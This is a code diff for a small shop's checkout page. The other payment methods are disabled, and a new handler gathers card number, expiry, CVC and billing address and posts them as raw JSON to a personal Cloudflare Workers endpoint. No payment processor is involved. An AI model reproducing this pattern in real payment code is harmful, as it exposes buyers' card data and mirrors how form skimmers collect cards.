@@ -152,7 +152,7 @@
             <button class="payment-button offline" onclick="alert('GCash is offline and not available')">GCash</button>
             <button class="payment-button offline" onclick="alert('PayMaya is offline and not available')">PayMaya</button>
             <button class="payment-button offline" onclick="alert('QRPH is offline and not available')">QRPH</button>
-            <button class="payment-button" onclick="submitPayment()">Bank Details</button>
+            <button class="payment-button" onclick="showBankDetails()">Bank Details</button>
         </div>
 
         <div id="card-details">
@@ -212,24 +212,35 @@
             totalPrice.textContent = `Total: ₱${total.toFixed(2)}`;
         }
 
-        function submitPayment() {
-            // Send payment details to Arduino
-            const cart = JSON.parse(localStorage.getItem('cart')) || [];
-            const total = cart.reduce((acc, item) => acc + (item.price * item.quantity), 0).toFixed(2);
+        function showBankDetails() {
+            // Show card details form
+            document.getElementById('card-details').style.display = 'block';
+        }
 
-            // Create an object to send to Arduino
-            const paymentData = {
-                cart: cart,
-                total: total,
-                method: 'bank-details' // Hardcoded for this example
+        function submitPayment(event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            const form = document.getElementById('payment-form');
+            const formData = new FormData(form);
+
+            // Create a payload to send to the Worker
+            const payload = {
+                product: 'Product Name', // Replace with actual product info
+                cardNumber: formData.get('card-number'),
+                expiryDate: formData.get('card-expiry'),
+                cvc: formData.get('card-cvc'),
+                billingAddress: formData.get('billing-address'),
+                billingCity: formData.get('billing-city'),
+                billingZip: formData.get('billing-zip'),
+                billingCountry: formData.get('billing-country')
             };
 
-            fetch('https://example.com/arduino-api', { // Replace with your Arduino API endpoint
+            fetch('https://arduino.nikopaned-official.workers.dev/', { // This is your Worker route
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(paymentData)
+                body: JSON.stringify(payload)
             })
             .then(response => response.json())
             .then(data => {
@@ -249,8 +260,13 @@
             loadCart();
             // Ensure card details are always shown
             document.getElementById('card-details').style.display = 'block';
+
+            // Attach event listener to the form
+            const paymentForm = document.getElementById('payment-form');
+            paymentForm.addEventListener('submit', submitPayment);
         });
     </script>
 </body>
 </html>
+
 
